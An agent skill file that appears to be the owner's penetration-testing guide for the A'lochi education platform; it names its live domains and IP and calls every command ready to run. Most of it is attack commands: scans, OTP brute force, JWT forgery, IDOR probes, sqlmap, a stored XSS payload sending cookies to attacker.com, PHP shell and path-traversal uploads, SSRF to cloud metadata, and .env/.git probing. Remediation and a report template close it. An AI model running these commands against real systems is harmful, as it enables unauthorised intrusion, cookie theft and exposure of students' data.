---
name: security-audit
description: >
  Complete penetration testing and security audit guide for the A'lochi platform.
  Every command is ready to run against the live target.
---

# Security Audit Skill — alochi.org

Complete penetration testing and security audit guide for the A'lochi platform. Every command is ready to run against the live target.

---

## 1. TARGET PROFILE

| Property | Value |
|----------|-------|
| Domain | alochi.org, api.alochi.org, crm.alochi.org |
| IP | 198.163.206.64 |
| Backend | Django 5 + DRF (gunicorn, port 8000 internal) |
| Frontend | Next.js 14 (port 3000 internal) |
| DB | PostgreSQL (port 5432, internal only) |
| Cache | Redis (port 6379, internal only) |
| Proxy | nginx (ports 80/443 external) |
| Containers | Docker Compose (alochi-backend, alochi-frontend, alochi-nginx, alochi-postgres, alochi-redis) |
| Auth | JWT (HS256, access 15min, refresh 30 days) via SimpleJWT |
| SSL | Let's Encrypt on api.alochi.org (managed by upstream nginx) |

### Known Security Posture (from source)
- `DEBUG=False` enforced in production (raises `ImproperlyConfigured` if gunicorn + DEBUG)
- `ALLOWED_HOSTS` wildcard blocked
- `CORS_ALLOW_ALL_ORIGINS` disabled in production
- Rate limits: login `5/minute`, anon `100/hour`, user `1000/hour`, AI `30/hour`, shop purchase `30/minute`
- Headers: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`
- Missing: `Content-Security-Policy`, `Strict-Transport-Security` (set by upstream, not this nginx), `Permissions-Policy`

---

## 2. RECONNAISSANCE

### Port Scan
```bash
# Full TCP scan with service detection
nmap -sV -sC -p- --open -T4 -oN alochi_full.txt 198.163.206.64

# UDP scan (top 100)
nmap -sU --top-ports 100 -T4 198.163.206.64

# Vuln scripts on web ports
nmap --script vuln -p 80,443,3001,8000 198.163.206.64

# Quick check for accidentally exposed services
nmap -p 5432,6379,8000,3001,27017 198.163.206.64
```

### Subdomain Enumeration
```bash
# Active enumeration
subfinder -d alochi.org -all -recursive -o subdomains.txt
dnsx -l subdomains.txt -resp -a -cname -o resolved.txt

# Brute force with wordlist
gobuster dns -d alochi.org -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# Certificate transparency
curl -s "https://crt.sh/?q=%.alochi.org&output=json" | jq '.[].name_value' | sort -u
```

### Directory & Endpoint Discovery
```bash
# API endpoints
ffuf -u https://api.alochi.org/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403 -t 50 -o endpoints.json

# Django admin
gobuster dir -u https://alochi.org \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,bak,old,env,git -t 40 -o dirs.txt

# Check for exposed sensitive files
for path in .env .git/HEAD .git/config backup.sql db.sqlite3 settings.py; do
  curl -sI "https://alochi.org/$path" | head -1
done
```

### Technology Fingerprinting
```bash
whatweb https://alochi.org -v
curl -sI https://api.alochi.org/api/v1/ | grep -i "server\|x-powered\|django\|version"

# Wayback / historical endpoints
waybackurls alochi.org | sort -u | tee wayback.txt
gau alochi.org --threads 5 --o gau.txt
cat wayback.txt gau.txt | grep "api\|admin\|upload\|export" | sort -u
```

---

## 3. AUTHENTICATION ATTACKS

### OTP Brute Force / Rate Limit
```bash
# Step 1: request OTP
curl -s -X POST https://api.alochi.org/api/v1/auth/send-otp/ \
  -H "Content-Type: application/json" \
  -d '{"phone": "+998901234567"}'

# Step 2: brute force OTP (4-digit = 10000 combos)
# Rate limit: 5/minute enforced — test if it actually blocks
for i in $(seq 1000 1005); do
  code=$(curl -s -X POST https://api.alochi.org/api/v1/auth/verify-otp/ \
    -H "Content-Type: application/json" \
    -d "{\"phone\": \"+998901234567\", \"otp\": \"$i\"}")
  echo "$i: $code"
  sleep 0.1
done

# Check if 429 fires after 5 attempts
# Expected: 429 Too Many Requests at attempt 6
```

### JWT Manipulation with jwt_tool
```bash
pip install jwt_tool

# Capture a valid token first
TOKEN="eyJ..."

# 1. Algorithm confusion: RS256 → HS256 (if public key obtainable)
python3 jwt_tool.py $TOKEN -X a -pk public.pem

# 2. None algorithm attack
python3 jwt_tool.py $TOKEN -X n

# 3. Decode and inspect claims
python3 jwt_tool.py $TOKEN -d

# 4. Modify role claim (student → admin) and resign with known secret
python3 jwt_tool.py $TOKEN -T -S hs256 -p "secret"
# A'lochi uses: JWT_SECRET from env (defaults to SECRET_KEY if not set separately)

# 5. Expired token replay
python3 jwt_tool.py $TOKEN -X e
```

### Manual JWT Manipulation
```bash
# Decode payload (no verification)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# A'lochi JWT claims to look for:
# { "token_type": "access", "user_id": 123, "role": "student", "exp": ... }

# Test: set role to "admin" and use wrong signature
HEADER='{"alg":"HS256","typ":"JWT"}'
PAYLOAD='{"token_type":"access","user_id":1,"role":"admin","exp":9999999999}'
# Craft tampered token and test against /api/v1/boss/ endpoints
```

---

## 4. AUTHORIZATION TESTING

### IDOR — Student Data Isolation
```bash
# Get student A's token
TOKEN_A="eyJ..."
# Get student B's token
TOKEN_B="eyJ..."

# Student A's user ID (from JWT decode or profile endpoint)
USER_A_ID=123
USER_B_ID=456

# Test: can student A read student B's profile?
curl -H "Authorization: Bearer $TOKEN_A" \
  "https://api.alochi.org/api/v1/students/$USER_B_ID/profile/"

# Test: student A accessing student B's XP/coins
curl -H "Authorization: Bearer $TOKEN_A" \
  "https://api.alochi.org/api/v1/xp/history/?user_id=$USER_B_ID"

# Test: student A accessing student B's test results
curl -H "Authorization: Bearer $TOKEN_A" \
  "https://api.alochi.org/api/v1/tests/attempts/?user=$USER_B_ID"
```

### Vertical Privilege Escalation
```bash
STUDENT_TOKEN="eyJ..."

# Test student access to boss panel
curl -H "Authorization: Bearer $STUDENT_TOKEN" \
  "https://alochi.org/api/v1/boss/stats/" -v

# Test student access to school admin endpoints
curl -H "Authorization: Bearer $STUDENT_TOKEN" \
  "https://api.alochi.org/api/v1/school/admin/students/" -v

# CRM: test agent accessing super_admin endpoints
CRM_TOKEN=$(curl -s -X POST https://api.alochi.org/api/v1/crm/auth/login/ \
  -d '{"username":"agent_user","password":"pass"}' | jq -r '.access')
curl -H "Authorization: CRM $CRM_TOKEN" \
  "https://api.alochi.org/api/v1/crm/agents/" -v  # Should be 403 for agent role
```

### API Access Control Matrix
Test each endpoint with each role. Expected results:

| Endpoint | student | school | boss | unauthenticated |
|----------|---------|--------|------|-----------------|
| `GET /api/v1/tests/` | 200 | 403 | 200 | 401 |
| `GET /api/v1/boss/stats/` | 403 | 403 | 200 | 401 |
| `GET /api/v1/school/students/` | 403 | 200 | 200 | 401 |
| `POST /api/v1/shop/purchase/` | 200 | 403 | 200 | 401 |
| `GET /api/v1/crm/leads/` | 403 | 403 | 403 | 401 |

---

## 5. INJECTION ATTACKS

### SQL Injection with sqlmap
```bash
# Authenticated scan on filtered endpoints
sqlmap -u "https://api.alochi.org/api/v1/tests/?grade=5&subject=math" \
  -H "Authorization: Bearer $TOKEN" \
  --level=3 --risk=2 --dbms=postgresql --batch -o

# POST body injection
sqlmap -u "https://api.alochi.org/api/v1/leaderboard/" \
  --data='{"period":"week","grade":"5"}' \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --method=POST --dbms=postgresql --batch

# Django ORM parameterises by default — focus on raw() queries and extra()
grep -r "raw\(\|\.extra\(\|cursor\." alochi_backend/apps/ --include="*.py"
```

### XSS Testing with dalfox
```bash
# Reflected XSS in search/filter params
dalfox url "https://alochi.org/search?q=test" \
  -H "Authorization: Bearer $TOKEN" \
  --silence --format json -o xss_results.json

# Stored XSS via profile fields (name, notes)
curl -X PATCH "https://api.alochi.org/api/v1/profile/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"full_name": "<script>fetch(\"https://attacker.com?c=\"+document.cookie)</script>"}'
```

### SSTI (Server-Side Template Injection)
```bash
# Test in any field rendered in email/notification templates
curl -X POST "https://api.alochi.org/api/v1/auth/send-otp/" \
  -d '{"phone": "{{7*7}}"}'
# If response contains "49" → SSTI confirmed

# Jinja2 payload
curl -X POST "https://api.alochi.org/api/v1/feedback/" \
  -d '{"message": "{{config.SECRET_KEY}}"}'
```

---

## 6. FILE UPLOAD SECURITY

A'lochi allows profile picture and homework file uploads. Test:

```bash
# 1. MIME type bypass — upload PHP as image
curl -X POST "https://api.alochi.org/api/v1/profile/avatar/" \
  -H "Authorization: Bearer $TOKEN" \
  -F "avatar=@shell.php;type=image/jpeg"

# 2. Extension bypass
cp shell.php shell.php.jpg
curl -X POST "https://api.alochi.org/api/v1/homework/submit/" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php.jpg"

# 3. Path traversal in filename
curl -X POST "https://api.alochi.org/api/v1/profile/avatar/" \
  -H "Authorization: Bearer $TOKEN" \
  -F "avatar=@../../../etc/passwd;filename=../../../etc/cron.d/evil"

# 4. Oversized file (bypass size limit)
dd if=/dev/zero bs=1M count=100 | curl -X POST \
  "https://api.alochi.org/api/v1/homework/submit/" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@-"

# 5. SVG with XSS payload
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > xss.svg
curl -X POST "https://api.alochi.org/api/v1/profile/avatar/" \
  -H "Authorization: Bearer $TOKEN" \
  -F "avatar=@xss.svg;type=image/svg+xml"
```

---

## 7. INFRASTRUCTURE

### HTTP Request Smuggling
```bash
# Install smuggler
pip install smuggler

# Test CL.TE
python3 smuggler.py -u https://alochi.org -m POST -l 3

# Manual CL.TE test
curl -s -X POST "https://alochi.org/" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  --data-binary $'1\r\nG\r\n0\r\n\r\n'
```

### SSRF Testing
```bash
# Any endpoint that fetches URLs (webhooks, avatar URLs, external resources)
curl -X POST "https://api.alochi.org/api/v1/profile/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"avatar_url": "http://169.254.169.254/latest/meta-data/"}'

# Test with Burp Collaborator / interactsh
curl -X POST "https://api.alochi.org/api/v1/profile/" \
  -d '{"avatar_url": "https://YOUR_INTERACTSH_URL.oast.pro"}'
```

### Exposed Sensitive Files
```bash
for path in \
  ".env" ".env.local" ".env.production" \
  ".git/HEAD" ".git/config" ".git/COMMIT_EDITMSG" \
  "backup.sql" "db.sqlite3" \
  "docker-compose.yml" "docker-compose.yaml" \
  "settings.py" "local_settings.py" \
  "requirements.txt" "Pipfile" \
  "alochi_backend/.env" "infrastructure/.env"; do
  status=$(curl -so /dev/null -w "%{http_code}" "https://alochi.org/$path")
  [ "$status" != "404" ] && echo "FOUND ($status): $path"
done
```

### Docker / Container Escape Vectors
```bash
# Check if docker socket is mounted (inside container)
ls -la /var/run/docker.sock 2>/dev/null && echo "DOCKER SOCKET EXPOSED"

# Check for privileged mode
cat /proc/self/status | grep CapEff
# Full caps (CapEff: 0000003fffffffff) = privileged container

# Check for writable host paths
mount | grep -v "tmpfs\|proc\|sys\|dev"
```

---

## 8. SECURITY HEADERS AUDIT

### Current State (from nginx.conf)
| Header | Status | Value |
|--------|--------|-------|
| `X-Frame-Options` | ✅ Set | `DENY` |
| `X-Content-Type-Options` | ✅ Set | `nosniff` |
| `Referrer-Policy` | ✅ Set | `strict-origin-when-cross-origin` |
| `Strict-Transport-Security` | ⚠️ Upstream only | Not in this nginx layer |
| `Content-Security-Policy` | ❌ Missing | Not set |
| `Permissions-Policy` | ❌ Missing | Not set |
| `X-Powered-By` | ⚠️ Check | May expose Django/Next.js version |

### Check Live Headers
```bash
curl -sI https://alochi.org | grep -i "x-frame\|x-content\|hsts\|csp\|permissions\|x-powered\|server"
curl -sI https://api.alochi.org/api/v1/ | grep -i "x-frame\|x-content\|hsts\|server"
```

### Fix in nginx.conf
```nginx
# Add to server block:
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.alochi.org" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
add_header X-Powered-By "" always;  # Remove this header
server_tokens off;  # Hide nginx version
```

---

## 9. BUG BOUNTY REPORT TEMPLATE

```markdown
## [SEVERITY] Brief vulnerability title

**Severity:** Critical / High / Medium / Low / Informational
**CVSS 3.1 Score:** X.X (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**CWE:** CWE-XXX — Name
**Affected endpoint:** POST /api/v1/endpoint/
**Authenticated:** Yes (student role) / No

### Summary
One-paragraph description of the vulnerability and its root cause.

### Steps to Reproduce
1. Obtain a valid student JWT token via `POST /api/v1/auth/verify-otp/`
2. Send the following request:
   ```bash
   curl -X GET "https://api.alochi.org/api/v1/students/VICTIM_ID/profile/" \
     -H "Authorization: Bearer ATTACKER_TOKEN"
   ```
3. Observe that victim's private data is returned.

### Impact
Attacker can read/modify/delete [specific data]. This affects [N] users.
Concrete harm: [data breach / account takeover / financial loss / etc.]

### Proof of Concept
```bash
# Full PoC commands here
TOKEN=$(curl -s -X POST ... | jq -r '.access')
curl -H "Authorization: Bearer $TOKEN" "https://api.alochi.org/..."
```

### Remediation
1. Add ownership check: `get_object_or_404(Profile, pk=pk, user=request.user)`
2. Add permission class: `IsOwnerOrAdmin`
3. Add test: `self.client.force_authenticate(other_user); response = self.client.get(...); self.assertEqual(response.status_code, 403)`

### References
- OWASP API Security Top 10 — API1:2023 Broken Object Level Authorization
- CWE-284: Improper Access Control
```

---

## 10. REMEDIATION TRACKING

### ✅ Fixed
- Rate limiting on all auth endpoints (5/min login, 100/hr anon)
- `X-Frame-Options: DENY` in nginx
- `X-Content-Type-Options: nosniff` in nginx
- `CORS_ALLOW_ALL_ORIGINS` disabled in production
- `DEBUG=False` enforced (raises exception if violated)
- `ALLOWED_HOSTS` wildcard blocked
- JWT HS256 with separate `JWT_SECRET` env var (not reusing `SECRET_KEY`)
- `SECURE_CONTENT_TYPE_NOSNIFF = True` in Django settings
- `SECURE_PROXY_SSL_HEADER` set for HTTPS detection behind nginx

### ⚠️ Pending
- `Content-Security-Policy` header missing
- `Permissions-Policy` header missing
- `Strict-Transport-Security` only set by upstream nginx (not guaranteed)
- `server_tokens off` not confirmed in nginx.conf
- Port 3001 — verify not externally accessible
- JWT `refresh` lifetime is 30 days — consider reducing to 7 days
- `X-Powered-By` header exposure — confirm removed

### 🗺️ Security Roadmap
1. **Now:** Add CSP header, enable HSTS at this nginx layer, audit file upload endpoints
2. **Q2:** Conduct full IDOR audit across all student/school data endpoints
3. **Q3:** eJPT certification → structured pentest methodology
4. **Q4:** BSCP (Burp Suite Certified Practitioner) → web app deep dive
5. **2027:** OSCP → infrastructure + privilege escalation

### Tools Reference
```bash
# Install essential tools
pip install jwt_tool sqlmap
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/ffuf/ffuf/v2@latest
apt install gobuster nmap whatweb

# Wordlists (SecLists)
git clone https://github.com/danielmiessler/SecLists /usr/share/seclists

# dalfox (XSS)
go install github.com/hahwul/dalfox/v2@latest

# interactsh (SSRF/OOB)
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```
